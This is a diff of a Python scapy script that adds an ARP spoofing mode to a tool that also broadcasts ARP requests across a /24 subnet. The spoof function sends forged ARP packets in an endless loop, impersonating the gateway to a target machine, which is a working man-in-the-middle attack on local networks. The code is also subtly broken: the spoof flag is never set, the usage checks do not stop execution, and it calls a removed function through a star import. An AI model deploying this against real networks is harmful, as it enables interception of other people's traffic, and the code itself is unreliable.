@@ -1,11 +1,12 @@
 from __future__ import print_function
+from ipaddress import ip_address
 from struct import pack
 from scapy.all import *
 from scapy.layers.l2 import ARP, Ether
 import time
 import threading
-import socket
 from optparse import OptionParser
+from sock import *
 
 # --bcast --who-has=[ip]
 # --spoof --ip=[ip] --gateway=[gateway] --mac=[mac]
@@ -13,43 +14,50 @@ from optparse import OptionParser
 ARP_REPLY = 0x02
 ADAPTER = "Ethernet"
 LOCAL_IP_ADDRESS = get_if_addr(ADAPTER)
-
-SERVER_PORT = 3000
-IP_ADDR = "127.0.0.1"
-socket_initialized = False
-sock = None
+packet = None
 packet_count = 1
 
+single_broadcast = False
+global_broadcast = False
+spoof_mode = False
 mutex = threading.Lock()
 
-parser = OptionParser()
-parser.add_option("--bcast",   action='store', dest='bcast',   type='string', help="Send broadcast arp")
-parser.add_option("--who-has", action='store', dest='who_has', type='string', help="Send broadcast arp")
+def print_usage():
+    print("python arp.py --bcast --who-has=[IP]")
+    print("python arp.py --spoof --ip=[IP] --gateway=[IP] --mac=[xx:xx:xx:xx:xx]")
 
-parser.add_option("--spoof",   action='store', dest='spoof',   type='string', help="Arp spoof a specific address")
-parser.add_option("--ip",      action='store', dest='ip',      type='string', help="Arp spoof a specific address")
-parser.add_option("--gateway", action='store', dest='gateway', type='string', help="Arp spoof a specific address")
-parser.add_option("--mac",     action='store', dest='mac',     type='string', help="Arp spoof a specific address")
+parser = OptionParser()
+# broadcast options
+parser.add_option("-b", "--bcast", action="store_true", dest='bcast',  help="Send broadcast arp")
+parser.add_option("--who-has",     action='store', dest='who_has', type='string', help="The ip we are looking for")
+# spoof options
+parser.add_option("--spoof",   action='store_true', dest='spoof', help="Arp spoof a specific address")
+parser.add_option("--ip",      action='store', dest='ip',      type='string', help="The address of the target")
+parser.add_option("--tmac",    action='store', dest='tmac',    type='string', help="The mac address of the target")
+parser.add_option("--gateway", action='store', dest='gateway', type='string', help="The gateway")
+parser.add_option("--smac",    action='store', dest='smac',    type='string', help="The mac address of the gateway")
 (options, args) = parser.parse_args()
 
-print(options.spoof)
+if (not options.spoof and not options.bcast) or (options.spoof and options.bcast):
+    print_usage()
+if options.spoof:
+    if not options.ip or not options.gateway or not options.tmac or not options.smac:
+        print_usage()
+    else:
+        pass
+if options.bcast:
+    if not options.who_has:
+        global_broadcast = True
+    else:
+        single_broadcast = True
 
-def init_sock(port, addr):
-    global sock
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(((addr, port)))
-    socket_initialized = True
+def spoof(dstip, hdst, srcip, hsrc):
+    while True:
+        send_packet(Ether(dst=hdst) / ARP(pdst=dstip, hwdst=hdst, psrc=srcip, hwsrc=hsrc))
 
-def send_tcp_data(data):
-    global sock
-    global socket_initialized
-    if not socket_initialized:
-        init_sock(SERVER_PORT, IP_ADDR)
-    sock.send(data.encode())
-
-def send_arp(ip):
+def send_packet(packet):
     global packet_count
-    sendp(Ether(dst='ff:ff:ff:ff:ff') / ARP(pdst=ip), iface=ADAPTER)
+    sendp(packet, iface=ADAPTER)
     mutex.acquire()
     send_tcp_data("Packet - " + str(packet_count))
     mutex.release()
@@ -72,5 +80,12 @@ if __name__ == "__main__":
     thread = threading.Thread(target=receiver, args=())
     thread.start()
     time.sleep(2)
-    for i in range(1, 256):
-        send_arp("192.168.0." + str(i))
+
+    if single_broadcast:
+        for i in range(3):
+            send_packet(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst=options.who_has))
+    elif global_broadcast:
+        for i in range(1, 256):
+            send_packet(Ether(dst='ff:ff:ff:ff:ff:ff') / ARP(pdst="192.168.0." + str(i)))
+    elif spoof_mode:
+        spoof(options.ip, options.tmac, options.gateway, options.smac)
